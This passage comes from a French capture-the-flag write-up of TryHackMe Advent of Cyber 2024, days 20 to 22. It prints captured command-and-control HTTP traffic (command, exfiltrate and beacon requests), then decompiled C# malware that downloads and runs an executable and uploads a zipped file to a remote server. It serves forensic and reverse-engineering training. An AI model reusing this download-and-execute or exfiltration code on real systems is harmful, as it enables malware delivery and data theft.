+Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **457** (`GET /command`)
+
+```http
+GET /command HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
+Host: [...expurgé...]:8080
+Connection: Keep-Alive
+
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.8.10
+Date: Thu, 17 Oct 2024 09:47:04 GMT
+Content-Type: text/plain
+
+[...expurgé...]
+```
+
+Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **476** (`POST /exfiltrate`)
+
+```http
+POST /exfiltrate HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
+Content-Type: multipart/form-data; boundary=f5964f77-daf1-4853-aacb-df4754eaacaf
+Host: 10.10.123.224:8080
+Content-Length: 300
+Connection: Keep-Alive
+
+--f5964f77-daf1-4853-aacb-df4754eaacaf
+Content-Disposition: form-data; name="file"; filename="[...expurgé...].txt"
+Content-Type: application/octet-stream
+
+AES ECB is your chance to decrypt the encrypted beacon with the key: 1234567890abcdef1234567890abcdef
+--f5964f77-daf1-4853-aacb-df4754eaacaf--
+
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.8.10
+Date: Thu, 17 Oct 2024 09:47:04 GMT
+
+Data received
+```
+
+Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **488** (`POST /beacon`)
+
+```http
+POST /beacon HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
+Content-Type: text/plain
+Host: 10.10.123.224:8080
+Content-Length: 77
+Connection: Keep-Alive
+
+Encrypted: 8724[...expurgé...]3249 (The exfiltrated file has a clue)
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.8.10
+Date: Thu, 17 Oct 2024 09:47:04 GMT
+
+Beacon acknowledged
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Nous utilisons CyberChef avec les informations données dans le flux précédent" %}
+
+## Jour 21 : *HELP ME...I'm REVERSE ENGINEERING*
+
+![Reverse engineering](https://img.shields.io/badge/Reverse%20engineering-314267?logo=tryhackme)
+
+![Jour 21](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732165566749.png)
+
+En décompilant `WarevilleApp.exe` nous y trouvons la fonction téléchargeant et exécutant un programme :
+
+```c#
+private void [...expurgé...]()
+{
+  string address = "http://[...expurgé...].thm:8080/dw/[...expurgé...].exe";
+  string text = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"), "[...expurgé...].exe");
+  using WebClient webClient = new WebClient();
+  try
+  {
+    if (File.Exists(text))
+    {
+      File.Delete(text);
+    }
+    webClient.DownloadFile(address, text);
+    Process.Start(text);
+  }
+  catch (Exception ex)
+  {
+    MessageBox.Show("An error occurred while downloading or executing the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
+  }
+}
+```
+
+En décompilant le fichier téléchargé par l'exécutable précédent :
+
+```c#
+private static void Main(string[] args)
+{
+  try
+  {
+    [...expurgé pour brièveté...]
+    string text2 = Path.Combine(Path.GetTempPath(), "[...expurgé...].zip");
+    [...expurgé pour brièveté...]
+  }
+}
+```
+
+```c#
+private static void UploadFileToServer(string zipFilePath)
+{
+  string address = "http://[...expurgé...].thm/upload";
+  using WebClient webClient = new WebClient();
+  try
+  {
+    webClient.UploadFile(address, zipFilePath);
+    Log("File uploaded successfully.");
+  }
+  catch (WebException)
+  {
+  }
+}
+```
+
+## Jour 22 : *It's because I'm kubed, isn't it?*
+
+![Kubernetes DFIR](https://img.shields.io/badge/Kubernetes%20DFIR-314267?logo=tryhackme)
+
+![Jour 22](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730975047352.png)
+
+<div class="text-center">
+    <i class="fa-solid fa-1xl text-info">La suite est pour bientot !</i><br />
+    <i class="fa-solid fa-spinner fa-spin-pulse fa-2xl text-info mt-3"></i>
+</div>
